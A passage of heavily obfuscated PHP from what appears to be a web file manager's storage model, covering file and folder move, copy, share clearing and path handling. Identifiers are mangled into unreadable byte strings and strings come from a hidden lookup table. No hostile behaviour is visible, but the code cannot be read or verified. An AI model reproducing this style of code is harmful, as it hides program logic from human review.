$this->_childrenItemCache[$Æùƒ«¼À] = $·¤úíŸ; } return $Ğ¸ÛÇÛ‡; } private function fileNameExistAuto($§âÛ×, $ŸéÀùâŸ) { $ÖéÀûÄ¼ =& $_SERVER[•€áå–Õ]; if ($ŸéÀùâŸ[$ÖéÀûÄ¼[484]] == $ÖéÀûÄ¼[100]) { return $this->fileNameExist($§âÛ×, $ŸéÀùâŸ[$ÖéÀûÄ¼[42]]); } return $this->fileNameExistCache($§âÛ×, $ŸéÀùâŸ[$ÖéÀûÄ¼[42]]); } private function fileNameExistCache($®ß¦ì®, $šª§£¼) { $ê­âæÉÃ =& $_SERVER[•€áå–Õ]; $šª§£¼ = strtolower($šª§£¼); $±”¢°†û = $this->_childrenList($®ß¦ì®); foreach ($±”¢°†û as $ıß–¢İ) { if ($šª§£¼ == strtolower($ıß–¢İ[$ê­âæÉÃ[42]])) { return $ıß–¢İ[$ê­âæÉÃ[193]]; } } return !1; } private function fileNameAutoCache($¼“Ñª·­, $µóõ®©¯, $Ï·‘éÎ, $óŠÊ¥ÎÇ) { $­ˆÚâûç =& $_SERVER[•€áå–Õ]; $äŒÛà’à = $this->_childrenList($¼“Ñª·­); $åİÑØîÃ = array_to_keyvalue($äŒÛà’à, $­ˆÚâûç[22], $­ˆÚâûç[42]); return $this->fileNameAutoGet($åİÑØîÃ, $µóõ®©¯, $Ï·‘éÎ, $óŠÊ¥ÎÇ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ò€Õ¬™œ, $ÛÁùµÆå, $óõñ§¼Õ = REPEAT_REPLACE, $³İÙ²Ş = '') { $¯ŠÁÌ…Ø =& $_SERVER[•€áå–Õ]; $¸¼Ø–·× = $this->sourceInfo($Ò€Õ¬™œ); $µìÍ‚šâ = $this->sourceInfo($ÛÁùµÆå); if ($¸¼Ø–·×[$¯ŠÁÌ…Ø[192]] == $µìÍ‚šâ[$¯ŠÁÌ…Ø[193]]) { if ($¸¼Ø–·×[$¯ŠÁÌ…Ø[484]] == $¯ŠÁÌ…Ø[100]) { Model($¯ŠÁÌ…Ø[482])->restore(array($Ò€Õ¬™œ)); } if (!$³İÙ²Ş || $³İÙ²Ş == $¸¼Ø–·×[$¯ŠÁÌ…Ø[42]]) { return $Ò€Õ¬™œ; } } $ŠĞœÂÅ = $this->pathInfoMore($Ò€Õ¬™œ); if ($this->isParentOf($Ò€Õ¬™œ, $ÛÁùµÆå)) { return !1; } if (!$¸¼Ø–·× || !$µìÍ‚šâ || $µìÍ‚šâ[$¯ŠÁÌ…Ø[464]] != $¯ŠÁÌ…Ø[100]) { return !1; } Hook::trigger($¯ŠÁÌ…Ø[637], $ŠĞœÂÅ); $this->targetIsDelete = intval($¸¼Ø–·×[$¯ŠÁÌ…Ø[484]]); if ($¸¼Ø–·×[$¯ŠÁÌ…Ø[192]] == $ÛÁùµÆå && $³İÙ²Ş != $¸¼Ø–·×[$¯ŠÁÌ…Ø[42]]) { $ëŒ˜ëá¸ = $this->fileNameExist($ÛÁùµÆå, $³İÙ²Ş); if ($ëŒ˜ëá¸ && $¸¼Ø–·×[$¯ŠÁÌ…Ø[464]] == $¯ŠÁÌ…Ø[224]) { $ü¯§ø‡é = $this->sourceInfo($ëŒ˜ëá¸); $š£ì²û = $this->fileHistory($ü¯§ø‡é, $¸¼Ø–·×[$¯ŠÁÌ…Ø[520]], $¸¼Ø–·×[$¯ŠÁÌ…Ø[88]]); if (!$š£ì²û) { Model($¯ŠÁÌ…Ø[523])->remove($¸¼Ø–·×[$¯ŠÁÌ…Ø[520]]); } $this->removeNow($Ò€Õ¬™œ, !1); $this->folderSizeReset($ÛÁùµÆå); Hook::trigger($¯ŠÁÌ…Ø[638], $ŠĞœÂÅ); return $ëŒ˜ëá¸; } } $¬Àâ¶íß = $³İÙ²Ş ? $³İÙ²Ş : $¸¼Ø–·×[$¯ŠÁÌ…Ø[42]]; $this->lockMoveStart($Ò€Õ¬™œ); $this->lockWriteStart($ÛÁùµÆå, $¬Àâ¶íß); $½ËÑŸĞÌ = array($¯ŠÁÌ…Ø[608] => array(), $¯ŠÁÌ…Ø[639] => !1); $this->clearShare($Ò€Õ¬™œ, $ÛÁùµÆå); $íü®şü = $this->fileNameExistAuto($ÛÁùµÆå, $¸¼Ø–·×); $§¯È²’ğ = $this->_move($Ò€Õ¬™œ, $ÛÁùµÆå, $óõñ§¼Õ, $½ËÑŸĞÌ, $³İÙ²Ş); $this->sourceCacheClear(); if ($¸¼Ø–·×[$¯ŠÁÌ…Ø[464]] == $¯ŠÁÌ…Ø[100] && $íü®şü) { $this->folderSizeResetChildren($§¯È²’ğ); } Model($¯ŠÁÌ…Ø[226])->linkAdd($½ËÑŸĞÌ[$¯ŠÁÌ…Ø[608]]); if ($íü®şü && $½ËÑŸĞÌ[$¯ŠÁÌ…Ø[639]]) { $this->removeNow($Ò€Õ¬™œ, !1); } $this->lockMoveEnd($Ò€Õ¬™œ); $this->lockWriteEnd($ÛÁùµÆå, $¬Àâ¶íß); $this->folderSizeReset($¸¼Ø–·×[$¯ŠÁÌ…Ø[192]]); $this->folderSizeReset($ÛÁùµÆå); $‡´…İ§« = array($¸¼Ø–·×[$¯ŠÁÌ…Ø[192]], $ÛÁùµÆå); if ($¸¼Ø–·×[$¯ŠÁÌ…Ø[464]] == $¯ŠÁÌ…Ø[100]) { $‡´…İ§«[] = $Ò€Õ¬™œ; } $this->updateModifyTime($‡´…İ§«); Model($¯ŠÁÌ…Ø[612])->eventMove($Ò€Õ¬™œ, $¸¼Ø–·×[$¯ŠÁÌ…Ø[192]], $ÛÁùµÆå); Hook::trigger($¯ŠÁÌ…Ø[638], $ŠĞœÂÅ); return $§¯È²’ğ; } private function _move($ÊŠÅÈî, $ë×’ˆ…´, $¦Ó»¶”÷, &$©…Ê©¬ş, $¢ğÀÊ­à = '') { $ë™¼ôêİ =& $_SERVER[•€áå–Õ]; $²±ÍôóÄ = $this->sourceInfo($ÊŠÅÈî); $Áûº‰˜ì = $²±ÍôóÄ[$ë™¼ôêİ[464]] == $ë™¼ôêİ[100]; $Å“Ô›ú¦ = $¢ğÀÊ­à ? $¢ğÀÊ­à : $²±ÍôóÄ[$ë™¼ôêİ[42]]; $©¡Æ÷ûš = $this->fileNameExistAuto($ë×’ˆ…´, $²±ÍôóÄ); $this->lockMoveStart($ÊŠÅÈî); $this->lockWriteStart($ë×’ˆ…´, $Å“Ô›ú¦); if (!$©¡Æ÷ûš) { return $this->_moveForce($ÊŠÅÈî, $ë×’ˆ…´, $Å“Ô›ú¦); } $‘ø„…‰ì = $©¡Æ÷ûš; $ÏÆ„Éİ¡ = !1; if ($Áûº‰˜ì) { if ($¦Ó»¶”÷ == REPEAT_RENAME_FOLDER) { $Å“Ô›ú¦ = $this->fileNameAuto($ë×’ˆ…´, $Å“Ô›ú¦, $¦Ó»¶”÷, $Áûº‰˜ì); $‘ø„…‰ì = $this->_moveForce($ÊŠÅÈî, $ë×’ˆ…´, $Å“Ô›ú¦); } else { if ($¦Ó»¶”÷ == REPEAT_RENAME_FOLDER) { $¦Ó»¶”÷ = REPEAT_RENAME; } $íåùúÈ— = $this->_childrenListSelect($ÊŠÅÈî); foreach ($íåùúÈ— as $¬ÇáŞ‹Ô) { $this->_move($¬ÇáŞ‹Ô[$ë™¼ôêİ[193]], $©¡Æ÷ûš, $¦Ó»¶”÷, $©…Ê©¬ş); } $ÏÆ„Éİ¡ = !0; } } else { if ($¦Ó»¶”÷ == REPEAT_SKIP) { $ÏÆ„Éİ¡ = !0; } else { if ($¦Ó»¶”÷ == REPEAT_RENAME || $¦Ó»¶”÷ == REPEAT_RENAME_FOLDER) { $Å“Ô›ú¦ = $this->fileNameAuto($ë×’ˆ…´, $Å“Ô›ú¦, $¦Ó»¶”÷, $Áûº‰˜ì); $‘ø„…‰ì = $this->_moveForce($ÊŠÅÈî, $ë×’ˆ…´, $Å“Ô›ú¦); } else { if ($¦Ó»¶”÷ == REPEAT_REPLACE) { $¹ÑÎß = $this->sourceInfoCache($©¡Æ÷ûš); $‚‰«•šù = $this->fileHistory($¹ÑÎß, $²±ÍôóÄ[$ë™¼ôêİ[520]], $²±ÍôóÄ[$ë™¼ôêİ[88]]); $ÏÆ„Éİ¡ = !0; if ($‚‰«•šù) { $©…Ê©¬ş[$ë™¼ôêİ[608]][] = $²±ÍôóÄ[$ë™¼ôêİ[520]]; } } } } } if ($ÏÆ„Éİ¡ && !$©…Ê©¬ş[$ë™¼ôêİ[639]]) { $©…Ê©¬ş[$ë™¼ôêİ[639]] = !0; } return $‘ø„…‰ì; } private function _moveForce($ËİäÕ³, $É”õ™üñ, $„„¹µùü) { $ªêğ«ùÑ =& $_SERVER[•€áå–Õ]; $ï›å¦¸ = $this->sourceInfo($ËİäÕ³); $âğÎú´ = $this->sourceInfo($É”õ™üñ); $ô‘‰—Á = $ï›å¦¸[$ªêğ«ùÑ[464]] == $ªêğ«ùÑ[100]; $ŞÈ®ïâ = array($ªêğ«ùÑ[456] => $âğÎú´[$ªêğ«ùÑ[193]], $ªêğ«ùÑ[631] => $âğÎú´[$ªêğ«ùÑ[564]] . $âğÎú´[$ªêğ«ùÑ[193]] . $ªêğ«ùÑ[60], $ªêğ«ùÑ[627] => $âğÎú´[$ªêğ«ùÑ[190]], $ªêğ«ùÑ[628] => $âğÎú´[$ªêğ«ùÑ[549]], $ªêğ«ùÑ[630] => USER_ID, $ªêğ«ùÑ[473] => $„„¹µùü); $’ÛÓ· = $ï›å¦¸[$ªêğ«ùÑ[190]] == SourceModel::TYPE_GROUP && $âğÎú´[$ªêğ«ùÑ[190]] == SourceModel::TYPE_GROUP && $ï›å¦¸[$ªêğ«ùÑ[549]] == $âğÎú´[$ªêğ«ùÑ[549]]; if (!$’ÛÓ· && $this->moveClearAuth) { Model($ªêğ«ùÑ[547])->authClear($ËİäÕ³); } $‡ËñÊö™ = $ï›å¦¸[$ªêğ«ùÑ[484]] == $ªêğ«ùÑ[100] && $âğÎú´[$ªêğ«ùÑ[484]] != $ªêğ«ùÑ[100]; if ($‡ËñÊö™) { $ŞÈ®ïâ[$ªêğ«ùÑ[483]] = 0; } if ($ô‘‰—Á) { $œ‚ÀˆÁ = array($ªêğ«ùÑ[631] => array($ªêğ«ùÑ[591], $ï›å¦¸[$ªêğ«ùÑ[564]] . $ï›å¦¸[$ªêğ«ùÑ[193]] . $ªêğ«ùÑ[592])); $°ÁèœƒÛ = $ï›å¦¸[$ªêğ«ùÑ[564]] . $ï›å¦¸[$ªêğ«ùÑ[193]] . $ªêğ«ùÑ[60]; $±İæÙÁû = $âğÎú´[$ªêğ«ùÑ[564]] . $âğÎú´[$ªêğ«ùÑ[193]] . $ªêğ«ùÑ[60] . $ï›å¦¸[$ªêğ«ùÑ[193]] . $ªêğ«ùÑ[60]; $œÓë½Ã¹ = array($ªêğ«ùÑ[631] => array($ªêğ«ùÑ[640], "\162\145\160\x6c\x61\x63\145\x28\160\x61\x72\x65\x6e\x74\114\x65\166\145\154\x2c\47{$°ÁèœƒÛ}\47\54\47{$±İæÙÁû}\x27\51"), $ªêğ«ùÑ[627] => $âğÎú´[$ªêğ«ùÑ[190]], $ªêğ«ùÑ[628] => $âğÎú´[$ªêğ«ùÑ[549]]); if ($‡ËñÊö™) { $œÓë½Ã¹[$ªêğ«ùÑ[483]] = 0; } $this->where($œ‚ÀˆÁ)->data($œÓë½Ã¹)->save(); } $this->where(array($ªêğ«ùÑ[470] => $ËİäÕ³))->data($ŞÈ®ïâ)->save(); return $ËİäÕ³; } private function clearShare($½¤®²§Ø, $‚ÉÁÔ²) { $ş¾¡Â›Í =& $_SERVER[•€áå–Õ]; $Óüî‘™¯ = $this->sourceInfo($½¤®²§Ø); $çªå¡’™ = $this->sourceInfo($‚ÉÁÔ²); if ($Óüî‘™¯[$ş¾¡Â›Í[549]] == $çªå¡’™[$ş¾¡Â›Í[549]] && $Óüî‘™¯[$ş¾¡Â›Í[190]] == $ş¾¡Â›Í[641]) { return; } $„‘‡¯…Í = array($ş¾¡Â›Í[564] => array($ş¾¡Â›Í[591], $Óüî‘™¯[$ş¾¡Â›Í[564]] . $½¤®²§Ø . $ş¾¡Â›Í[592])); $šŸ¿…ÕÌ = $this->field($ş¾¡Â›Í[470])->where($„‘‡¯…Í)->getField($ş¾¡Â›Í[193], !0); if (!$šŸ¿…ÕÌ) { return; } $„‘‡¯…Í = array($ş¾¡Â›Í[193] => array($ş¾¡Â›Í[17], $šŸ¿…ÕÌ), $ş¾¡Â›Í[642] => 1); $›ÃÆÑ = Model($ş¾¡Â›Í[643])->field($ş¾¡Â›Í[644])->where($„‘‡¯…Í)->select(); if (!$›ÃÆÑ) { return; } $›ÃÆÑ = array_to_keyvalue($›ÃÆÑ, $ş¾¡Â›Í[22], $ş¾¡Â›Í[644]); $„‘‡¯…Í = array($ş¾¡Â›Í[644] => array($ş¾¡Â›Í[17], $›ÃÆÑ)); Model($ş¾¡Â›Í[643])->where($„‘‡¯…Í)->save(array($ş¾¡Â›Í[642] => 0)); Model($ş¾¡Â›Í[645])->where($„‘‡¯…Í)->delete(); } public function copyFolderFromIO($ßŞ¹ïÆè, $Úì®­ŒÃ, $Ê±¸“¾ø, $ó²àà, $˜†â˜Ğõ, $„í¾“éĞ = false) { $Ğ‘‡¼­ =& $_SERVER[•€áå–Õ]; $šäõ»éí = array($Ğ‘‡¼­[609] => array(), $Ğ‘‡¼­[610] => array(), $Ğ‘‡¼­[608] => array(), $Ğ‘‡¼­[646] => array()); $ë¹£Úåˆ = $„í¾“éĞ ? $„í¾“éĞ : $ßŞ¹ïÆè->pathThis($Úì®­ŒÃ); $ĞÆÍõ³ = $this->fileNameExist($Ê±¸“¾ø, $ë¹£Úåˆ); $³û£ğ®ê = $this->mkdir($Ê±¸“¾ø, $ë¹£Úåˆ, $ó²àà); if (!$ĞÆÍõ³ || $ó²àà == REPEAT_RENAME_FOLDER) { $ó²àà = !1; } if ($ĞÆÍõ³) { $this->_childrenAllMake($ĞÆÍõ³); } Hook::trigger($Ğ‘‡¼­[647]); $this->_copyChildTo($ßŞ¹ïÆè, $Úì®­ŒÃ, $³û£ğ®ê, $ó²àà, $šäõ»éí, $˜†â˜Ğõ); Hook::trigger($Ğ‘‡¼­[648]); if ($³û£ğ®ê) { $this->folderSizeResetChildren($³û£ğ®ê); } $this->_childrenListClear(); Model($Ğ‘‡¼­[611])->addAll($šäõ»éí[$Ğ‘‡¼­[609]], array(), !0); Model($Ğ‘‡¼­[612])->eventCopy($³û£ğ®ê); $this->saveAll($šäõ»éí[$Ğ‘‡¼­[610]]); Model($Ğ‘‡¼­[523])->linkAdd($šäõ»éí[$Ğ‘‡¼­[608]]); Model($Ğ‘‡¼­[523])->remove($šäõ»éí[$Ğ‘‡¼­[646]]); $this->folderSizeReset($Ê±¸“¾ø); $this->updateModifyTime($Ê±¸“¾ø); return $³û£ğ®ê; } private function _copyChildTo($‘³Ç¦¯, $´Ó´ú¥, $»öö½¶¶, $›ÒºöÇÃ, &$š›ÄßÛ, $¨¾×³†¹) { $Ö¿Ùæ¨‘ =& $_SERVER[•€áå–Õ]; $›ˆáôšª = $this->sourceInfoCache($»öö½¶¶); $Èı•Œ¹™ = $‘³Ç¦¯->listPath($´Ó´ú¥); $Èı•Œ¹™ = $Èı•Œ¹™ ? $Èı•Œ¹™ : array($Ö¿Ùæ¨‘[95] => array(), $Ö¿Ùæ¨‘[94] => array()); $Ë™Û†„£ = array_merge($Èı•Œ¹™[$Ö¿Ùæ¨‘[95]], $Èı•Œ¹™[$Ö¿Ùæ¨‘[94]]); $É»¨Úª½ = $this->_addFiles($‘³Ç¦¯, $Èı•Œ¹™[$Ö¿Ùæ¨‘[95]], $¨¾×³†¹); $â Òø’Û = array(); foreach ($Ë™Û†„£ as &$éÀÖ—Šî) { if (isset($É»¨Úª½[$éÀÖ—Šî[$Ö¿Ùæ¨‘[42]]])) { $éÀÖ—Šî = $É»¨Úª½[$éÀÖ—Šî[$Ö¿Ùæ¨‘[42]]]; } $éÀÖ—Šî[$Ö¿Ùæ¨‘[464]] = $éÀÖ—Šî[$Ö¿Ùæ¨‘[43]] == $Ö¿Ùæ¨‘[87]; $éÀÖ—Šî[$Ö¿Ùæ¨‘[465]] = substr(_get($éÀÖ—Šî, $Ö¿Ùæ¨‘[187], $Ö¿Ùæ¨‘[22]), 0, 10); $éÀÖ—Šî[$Ö¿Ùæ¨‘[88]] = _get($éÀÖ—Šî, $Ö¿Ùæ¨‘[88], 0); $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]] = _get($éÀÖ—Šî, $Ö¿Ùæ¨‘[520], 0); if (!isset($éÀÖ—Šî[$Ö¿Ùæ¨‘[649]]) && $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]]) { $š›ÄßÛ[$Ö¿Ùæ¨‘[646]][] = $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]]; } if ($›ÒºöÇÃ) { $¥ô™‚€ = $this->fileNameExistCache($»öö½¶¶, $éÀÖ—Šî[$Ö¿Ùæ¨‘[42]]); if ($¥ô™‚€) { if ($éÀÖ—Šî[$Ö¿Ùæ¨‘[464]] || $›ÒºöÇÃ == REPEAT_SKIP) { continue; } if ($›ÒºöÇÃ == REPEAT_REPLACE) { $µÕİó = $this->sourceInfoCache($¥ô™‚€); $ììÏÀ = $this->fileHistory($µÕİó, $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]], $éÀÖ—Šî[$Ö¿Ùæ¨‘[88]]); if ($ììÏÀ) { $š›ÄßÛ[$Ö¿Ùæ¨‘[608]][] = $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]]; } continue; } else { if ($›ÒºöÇÃ == REPEAT_RENAME) { $éÀÖ—Šî[$Ö¿Ùæ¨‘[42]] = $this->fileNameAutoCache($»öö½¶¶, $éÀÖ—Šî[$Ö¿Ùæ¨‘[42]], $›ÒºöÇÃ, !1); } } } } if (!$éÀÖ—Šî[$Ö¿Ùæ¨‘[464]] && $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]] == 0) { continue; } if (!$éÀÖ—Šî[$Ö¿Ùæ¨‘[464]] && $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]]) { $š›ÄßÛ[$Ö¿Ùæ¨‘[608]][] = $éÀÖ—Šî[$Ö¿Ùæ¨‘[520]]; } $â Òø’Û[] = $this->_makeItemData($éÀÖ—Šî, $›ˆáôšª, $éÀÖ—Šî[$Ö¿Ùæ¨‘[42]]); } unset($éÀÖ—Šî); if (!empty($â Òø’Û)) { $this->addAll($â Òø’Û); $this->_childrenListSelect($»öö½¶¶); } $ş”’ó• = $this->_childrenList($»öö½¶¶); $ş”’ó• = array_to_keyvalue($ş”’ó•, $Ö¿Ùæ¨‘[42]); foreach ($Ë™Û†„£ as $éÀÖ—Šî) { $µÕİó = $ş”’ó•[$éÀÖ—Šî[$Ö¿Ùæ¨‘[42]]]; $¼˜øõ« = $µÕİó[$Ö¿Ùæ¨‘[193]]; $this->_copyApplyMeta($µÕİó, $š›ÄßÛ); if ($éÀÖ—Šî[$Ö¿Ùæ¨‘[43]] == $Ö¿Ùæ¨‘[87]) { $éÀÖ—Šî[$Ö¿Ùæ¨‘[96]] = $‘³Ç¦¯->getPathInner($éÀÖ—Šî[$Ö¿Ùæ¨‘[96]]); $this->_copyChildTo($‘³Ç¦¯, $éÀÖ—Šî[$Ö¿Ùæ¨‘[96]], $¼˜øõ«, $›ÒºöÇÃ, $š›ÄßÛ, $¨¾×³†¹); } } } private function _addFiles($•ø¬ÕÜâ, $¤ªæ½¥, $Œ¾šàÕ½) { $ö’ŸÆ­ß =& $_SERVER[•€áå–Õ]; if (!$¤ªæ½¥ || count($¤ªæ½¥) == 0) { return array(); } $ûç¶·™µ = array(); foreach ($¤ªæ½¥ as &$àê¥à) { Hook::trigger($ö’ŸÆ­ß[650], $àê¥à); $àê¥à[$ö’ŸÆ­ß[96]] = $•ø¬ÕÜâ->getPathInner($àê¥à[$ö’ŸÆ­ß[96]]); $ˆ× ’ÍŠ = $•ø¬ÕÜâ->hashSimple($àê¥à[$ö’ŸÆ­ß[96]]); $ ”¼°³æ = $•ø¬ÕÜâ->hashMd5($àê¥à[$ö’ŸÆ­ß[96]]); if (strlen($ ”¼°³æ) > 10 && !isset($ûç¶·™µ[$ ”¼°³æ])) { $ûç¶·™µ[$ ”¼°³æ] = array(); } $àê¥à[$ö’ŸÆ­ß[651]] = $ˆ× ’ÍŠ; $àê¥à[$ö’ŸÆ­ß[526]] = $ ”¼°³æ; $ûç¶·™µ[$ ”¼°³æ][] =& $àê¥à; if (count($ûç¶·™µ[$ ”¼°³æ]) > 1) { $àê¥à[$ö’ŸÆ­ß[649]] = !0; } Hook::trigger($ö’ŸÆ­ß[652], $àê¥à); } unset($àê¥à); $ÂÓÀÑÛè = array($ö’ŸÆ­ß[526] => array($ö’ŸÆ­ß[17], array_keys($ûç¶·™µ))); $¹ïÙÁø• = Model($ö’ŸÆ­ß[653]); $™“’üœ¬ = $¹ïÙÁø•->where($ÂÓÀÑÛè)->select(); $™“’üœ¬ = $™“’üœ¬ ? $™“’üœ¬ : array(); foreach ($™“’üœ¬ as $Œ×æ„ªö) { if (!isset($ûç¶·™µ[$Œ×æ„ªö[$ö’ŸÆ­ß[526]]])) { continue; } $Ûñ×ı­û = $ûç¶·™µ[$Œ×æ„ªö[$ö’ŸÆ­ß[526]]]; foreach ($Ûñ×ı­û as &$àê¥à) { $àê¥à[$ö’ŸÆ­ß[520]] = $Œ×æ„ªö[$ö’ŸÆ­ß[520]]; $àê¥à[$ö’ŸÆ­ß[649]] = !0; } unset($àê¥à); } $†ÃšŒà = array(); foreach ($¤ªæ½¥ as $™‘ûîß¥) { Hook::trigger($ö’ŸÆ­ß[654], $™‘ûîß¥); if (isset($™‘ûîß¥[$ö’ŸÆ­ß[649]]) && $™‘ûîß¥[$ö’ŸÆ­ß[649]]) { Hook::trigger($ö’ŸÆ­ß[655], $™‘ûîß¥); continue; } $•ïÆ®… = $•ø¬ÕÜâ->getPathInner($™‘ûîß¥[$ö’ŸÆ­ß[96]]); $æÓôÀ˜” = $¹ïÙÁø•->addFileMake($•ïÆ®…, $™‘ûîß¥[$ö’ŸÆ­ß[88]], $™‘ûîß¥[$ö’ŸÆ­ß[651]], $™‘ûîß¥[$ö’ŸÆ­ß[526]], $™‘ûîß¥[$ö’ŸÆ­ß[42]], $Œ¾šàÕ½); Hook::trigger($ö’ŸÆ­ß[655], $™‘ûîß¥); if (!is_array($æÓôÀ˜”)) { continue; } $†ÃšŒà[] = $æÓôÀ˜”; } $¹ïÙÁø•->addAll($†ÃšŒà); $ÂÓÀÑÛè = array($ö’ŸÆ­ß[526] => array($ö’ŸÆ­ß[17], array_keys($ûç¶·™µ))); $™“’üœ¬ = $¹ïÙÁø•->where($ÂÓÀÑÛè)->select(); $™“’üœ¬ = $™“’üœ¬ ? $™“’üœ¬ : array(); foreach ($™“’üœ¬ as $Œ×æ„ªö) { if (!isset($ûç¶·™µ[$Œ×æ„ªö[$ö’ŸÆ­ß[526]]])) { continue; } $œŸÄ’» =& $ûç¶·™µ[$Œ×æ„ªö[$ö’ŸÆ­ß[526]]]; foreach ($œŸÄ’» as &$àê¥à) { $àê¥à[$ö’ŸÆ­ß[520]] = $Œ×æ„ªö[$ö’ŸÆ­ß[520]]; } unset($àê¥à); } $Ó†çâ¢‹ = array(); foreach ($¤ªæ½¥ as $¿¢á¶‡æ) { $Ó†çâ¢‹[$¿¢á¶‡æ[$ö’ŸÆ­ß[42]]] = $¿¢á¶‡æ; } return $Ó†çâ¢‹; } } goto C–‘Ò·¤Ü; cóÜÏ¨¢’¯: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¿æŸöÛ· =& $_SERVER[•€áå–Õ]; $this->objectDriver = array($¿æŸöÛ·[70], $¿æŸöÛ·[71], $¿æŸöÛ·[72], $¿æŸöÛ·[73], $¿æŸöÛ·[74], $¿æŸöÛ·[75], $¿æŸöÛ·[76], $¿æŸöÛ·[77], $¿æŸöÛ·[78], $¿æŸöÛ·[79], $¿æŸöÛ·[80]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($È†ÏüÃ•) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($È†ÏüÃ•, $_SERVER[•€áå–Õ][18]); } return $È†ÏüÃ•; } public function iconvApp($•¹ï×ª’) { return $•¹ï×ª’; } public function iconvSystem($Õ…õ‹ßÒ) { return $Õ…õ‹ßÒ; } public function iconvTo($ü•€é‡Í, $Ì®›÷êİ, $¨½—÷’) { $ãÅë¡ÂÃ =& $_SERVER[•€áå–Õ]; if (!$ü•€é‡Í || !function_exists($ãÅë¡ÂÃ[81])) { return $ü•€é‡Í; } static $‹ğş™¾ë = array(); $ø£áºÚò = $Ì®›÷êİ . $ãÅë¡ÂÃ[82] . $¨½—÷’ . $ãÅë¡ÂÃ[83] . $ü•€é‡Í; if (isset($‹ğş™¾ë[$ø£áºÚò])) { return $‹ğş™¾ë[$ø£áºÚò]; } if (function_exists($ãÅë¡ÂÃ[84])) { $ÃË÷–«¤ = @mb_convert_encoding($ü•€é‡Í, $¨½—÷’, $Ì®›÷êİ); } else { $ÃË÷–«¤ = @iconv($Ì®›÷êİ, $¨½—÷’, $ü•€é‡Í); } $ÃË÷–«¤ = $ÃË÷–«¤ ? $ÃË÷–«¤ : $ü•€é‡Í; if (strstr($ÃË÷–«¤, $ãÅë¡ÂÃ[85])) { $ÃË÷–«¤ = str_replace($ãÅë¡ÂÃ[85], $ãÅë¡ÂÃ[21], $ÃË÷–«¤); } $‹ğş™¾ë[$Ì®›÷êİ . $ãÅë¡ÂÃ[82] . $¨½—÷’ . $ãÅë¡ÂÃ[83] . $ü•€é‡Í] = $ÃË÷–«¤; $‹ğş™¾ë[$¨½—÷’ . $ãÅë¡ÂÃ[82] . $Ì®›÷êİ . $ãÅë¡ÂÃ[83] . $ü•€é‡Í] = $ü•€é‡Í; $‹ğş™¾ë[$¨½—÷’ . $ãÅë¡ÂÃ[82] . $Ì®›÷êİ . $ãÅë¡ÂÃ[83] . $ÃË÷–«¤] = $ü•€é‡Í; $‹ğş™¾ë[$Ì®›÷êİ . $ãÅë¡ÂÃ[82] . $¨½—÷’ . $ãÅë¡ÂÃ[83] . $ÃË÷–«¤] = $ÃË÷–«¤; return $ÃË÷–«¤; } public function getPathInner($¹ÏšÄ) { $ãÇœÈş¸ = IO::init($¹ÏšÄ); return $ãÇœÈş¸->path; } public function getPathOuter($Û—ıµ§¼) { $¶¾ ÃÅ¥ =& $_SERVER[•€áå–Õ]; $·“ı€¶ù = strlen(trim($this->pathBase, $¶¾ ÃÅ¥[18])); $Û—ıµ§¼ = substr(trim($Û—ıµ§¼, $¶¾ ÃÅ¥[18]), $·“ı€¶ù); return $this->pathDriver . $¶¾ ÃÅ¥[18] . ltrim($Û—ıµ§¼, $¶¾ ÃÅ¥[18]); } public function isParentOf($¨ú¤ æ, $¥ÚïÇÃ) { $ÎÙöœüà =& $_SERVER[•€áå–Õ]; $¨ú¤ æ = rtrim(strtolower($¨ú¤ æ), $ÎÙöœüà[18]) . $ÎÙöœüà[18]; $¥ÚïÇÃ = rtrim(strtolower($¥ÚïÇÃ), $ÎÙöœüà[18]) . $ÎÙöœüà[18]; $şĞóôùã = strpos($¥ÚïÇÃ, $¨ú¤ æ) === 0; return $şĞóôùã; } public function getType() { $ŸÚ€ÇÖª =& $_SERVER[•€áå–Õ]; $ßƒ¬ü… = str_replace($ŸÚ€ÇÖª[86], $ŸÚ€ÇÖª[22], get_class($this)); return strtolower($ßƒ¬ü…); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($µ›Â„‘è, $Åì˜«Æ¹) { $™šü¶ƒ =& $_SERVER[•€áå–Õ]; $ÃäôÒïì = rtrim($µ›Â„‘è, $™šü¶ƒ[18]) . $™šü¶ƒ[18] . $Åì˜«Æ¹; $õ×—ã— = $this->exist($ÃäôÒïì); return $õ×—ã— ? $ÃäôÒïì : !1; } public function setModifyTime($¼¼ÄŠı, $Ë¾¡«ˆ¶ = '') { } public function renameObject($  ãÔÊÄ, $úçëöğë) { $Ñ¸´¼³² = $úçëöğë; $  ãÔÊÄ = $this->getPathOuter($  ãÔÊÄ); $úçëöğë = $this->pathFather($  ãÔÊÄ) . $úçëöğë; $½÷¤›ğÆ = IO::copy($  ãÔÊÄ, $this->pathFather($  ãÔÊÄ), REPEAT_RENAME_FOLDER, $Ñ¸´¼³²); if ($½÷¤›ğÆ) { IO::remove($  ãÔÊÄ); } return $½÷¤›ğÆ ? $úçëöğë : !1; } public function tempFile($´©™¨§ = '', $£„ßæ³Å = '') { if (!$´©™¨§) { $´©™¨§ = rand_string(15); } $¨Îø¥­’ = TEMP_FILES . rand_string(15) . $_SERVER[•€áå–Õ][18]; @mkdir($¨Îø¥­’, DEFAULT_PERRMISSIONS, !0); $Èï£ƒó¿ = $¨Îø¥­’ . $´©™¨§; @touch($Èï£ƒó¿); if ($£„ßæ³Å) { file_put_contents($Èï£ƒó¿, $£„ßæ³Å); } return $Èï£ƒó¿; } public function tempFileRemve($°Îâ¿şŠ) { @unlink($°Îâ¿şŠ); @rmdir($this->pathFather($°Îâ¿şŠ)); } public function mkfile($”¡Ú»ó¦, $ÖÓ…†–½ = '', $“ÔºÇ = REPEAT_RENAME) { } public function mkdir($šŸ«ÎÌ¥, $œØÓ êÃ = REPEAT_SKIP) { } public function delFile($³™É‚») { } public function 